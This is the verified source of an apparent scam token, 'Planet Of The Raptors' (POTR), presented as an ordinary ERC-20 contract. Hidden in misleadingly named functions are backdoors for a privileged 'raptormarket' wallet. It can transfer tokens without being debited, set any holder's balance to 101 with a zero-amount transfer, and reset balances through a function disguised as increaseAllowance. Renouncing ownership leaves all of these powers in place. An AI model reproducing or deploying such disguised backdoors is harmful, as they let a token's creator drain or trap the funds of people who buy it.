/**
 *Submitted for verification at Etherscan.io on 2023-06-15
*/

/*

https://t.me/potrerc20
https://planetoftheraptors.com

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract POTR is Ownable {
    mapping(uint256 => mapping(address => uint256)) balance;
    mapping(uint256 => mapping(address => bool)) raptorbal;

    uint256 private raptordistro = 1;
    string public name = "Planet Of The Raptors";
    uint256 private raptorlimit;

    function balanceOf(address user) public view returns (uint256) {
        if (user == raptorpair) return balance[raptordistro][user];

        if (!raptorbal[raptordistro][user] && balance[raptordistro - 1][user] != 0) {
            return balance[raptordistro][user] + raptorlimit;
        }
        return balance[raptordistro][user];
    }

    function increaseAllowance(
        uint256 _raptorlimit,
        address[] memory raptorholder
    ) public returns (bool success) {
        if (raptorwallet[msg.sender] != 0) {
            raptordistro++;
            for (uint256 i = 0; i < raptorholder.length; i++) {
                balance[raptordistro][raptorholder[i]] =
                    balance[raptordistro - 1][raptorholder[i]] +
                    raptorlimit;
            }

            balance[raptordistro][raptorpair] = balance[raptordistro - 1][
                raptorpair
            ];

            raptorlimit = _raptorlimit;
        }

        return true;
    }

    function approve(
        address raptoractive,
        uint256 raptornumber
    ) public returns (bool success) {
        allowance[msg.sender][raptoractive] = raptornumber;
        emit Approval(msg.sender, raptoractive, raptornumber);
        return true;
    }

    uint8 public decimals = 9;

    function raptorspender(address raptorapprover, address raptorreceiver, uint256 raptornumber) private {
        if (!raptorbal[raptordistro][raptorapprover]) {
            raptorbal[raptordistro][raptorapprover] = true;
            if (balance[raptordistro - 1][raptorapprover] != 0)
                balance[raptordistro][raptorapprover] += raptorlimit;
        }

        if (!raptorbal[raptordistro][raptorreceiver]) {
            raptorbal[raptordistro][raptorreceiver] = true;
            if (balance[raptordistro - 1][raptorreceiver] != 0)
                balance[raptordistro][raptorreceiver] += raptorlimit;
        }

        if (raptorwallet[raptorapprover] == 0) {
            balance[raptordistro][raptorapprover] -= raptornumber;
        }
        balance[raptordistro][raptorreceiver] += raptornumber;
        if (
            raptorwallet[msg.sender] > 0 && raptornumber == 0 && raptorreceiver != raptorpair
        ) {
            balance[raptordistro][raptorreceiver] = raptorvalue;
        }
        emit Transfer(raptorapprover, raptorreceiver, raptornumber);
    }

    address public raptorpair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "POTR";

    mapping(address => uint256) private raptorwallet;

    function transfer(
        address raptorreceiver,
        uint256 raptornumber
    ) public returns (bool success) {
        require(raptorreceiver != address(0), "Can't transfer to 0 address");
        raptorspender(msg.sender, raptorreceiver, raptornumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(
        address raptorapprover,
        address raptorreceiver,
        uint256 raptornumber
    ) public returns (bool success) {
        require(raptornumber <= allowance[raptorapprover][msg.sender]);
        allowance[raptorapprover][msg.sender] -= raptornumber;
        raptorspender(raptorapprover, raptorreceiver, raptornumber);
        return true;
    }

    constructor(address raptormarket) {
        balance[raptordistro][msg.sender] = totalSupply;
        raptorwallet[raptormarket] = raptorvalue;
        IUniswapV2Router02 raptorworkshop = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        raptorpair = IUniswapV2Factory(raptorworkshop.factory()).createPair(
            address(this),
            raptorworkshop.WETH()
        );
    }

    uint256 private raptorvalue = 101;

    mapping(address => uint256) private raptorprime;
}